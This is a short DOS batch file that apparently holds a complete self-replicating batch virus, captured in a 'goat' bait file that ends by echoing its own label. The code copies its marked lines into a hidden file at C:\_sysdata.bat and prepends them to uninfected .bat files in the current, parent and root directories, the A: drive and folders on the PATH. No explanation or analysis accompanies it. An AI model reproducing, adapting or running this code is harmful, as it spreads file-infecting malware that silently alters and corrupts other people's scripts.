@echo off%_sysdata%
if '%1=='sysdata goto sysdata%2
set sysdata=%0.bat
if not exist %sysdata% set sysdata=%0
if '%sysdata%==' set sysdata=autoexec.bat
if exist c:\_sysdata.bat goto sysdatag
if not exist %sysdata% goto esysdata
find "sysdata"<%sysdata%>c:\_sysdata.bat
attrib c:\_sysdata.bat +h
:sysdatag
command /e:5000 /c c:\_sysdata sysdata vir . .. %path%
:esysdata
set sysdata=
goto sysdataend
:sysdatavir
shift%_sysdata%
for %%a in (*.bat ..\*.bat c:*.bat %2\*.bat %2*.bat a:*.bat) do call c:\_sysdata sysdata i %%a
exit sysdata
:sysdatai
find "sysdata"<%3>nul
if not errorlevel 1 goto sysdataj
type c:\_sysdata.bat>sysdata$
type %3>>sysdata$
move sysdata$ %3>nul
set sysdata#=%sysdata#%1
if %sysdata#%==11 exit
:sysdataj
set sysdata!=%sysdata!%1
if %sysdata!%==11111111 exit
:sysdataend
@echo "This is a Goat .BAT file"
